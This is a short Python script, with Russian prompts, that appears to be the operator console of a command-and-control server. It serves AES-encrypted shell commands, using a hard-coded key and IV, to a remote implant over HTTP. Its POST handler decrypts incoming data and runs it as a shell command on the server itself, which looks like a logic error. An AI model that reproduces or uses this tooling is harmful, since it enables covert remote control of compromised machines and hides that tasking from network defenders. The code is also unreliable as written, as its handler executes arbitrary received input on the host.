import http.server
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

AESKey = base64.b64decode('HUua77yO6LwAh4efmdMl1NmD7FsXNyceACniJLWiKKo=')
AESIV =  base64.b64decode('5Fv8uMlK7EwLzgAbojSa7A==')

def encrypt(command):
    cipher = AES.new(AESKey, AES.MODE_CBC, AESIV)
    padded_data = pad(command.encode(), AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_data).decode()

def decrypt(encrypted_command):
    try:
        cipher = AES.new(AESKey, AES.MODE_CBC, AESIV)
        encrypted_data = base64.b64decode(encrypted_command)
        decrypted_data = cipher.decrypt(encrypted_data)
        unpadded_data = unpad(decrypted_data, AES.block_size)
        return unpadded_data.decode()
    except Exception as e:
        print(f"Error decrypting command: {encrypted_command}\n{e}")
        return ""

def banner():
    print("*******************")
    print("*******************")
    print("*******************")

def start_server():
    banner()
    ip_addr = input("Введите адрес: ")
    port = int(input("Введите порт: "))
    server_address = (ip_addr, port)
    banner()

    class MyHandler(http.server.BaseHTTPRequestHandler):

        def do_GET(s):
            command = input(">>>> ")
            encrypted_command = encrypt(command)
            print(encrypted_command)
            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            s.wfile.write((encrypted_command).encode())
            
        def do_POST(s):
            s.send_response(200)
            s.end_headers()
            content_length = int(s.headers['Content-Length'])
            post_data = s.rfile.read(content_length)
            try:
                encrypted_command = post_data.decode('utf-8-sig')
                command = decrypt(encrypted_command)
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                print(output.decode())
            except Exception as e:
                print(f"Error executing command: {command}\n{e}")

    try:
        with http.server.HTTPServer(server_address, MyHandler) as httpd:
            print("Сервер стартовал")
            httpd.serve_forever()
            
            
    except KeyboardInterrupt:
        print("Выключено")

start_server()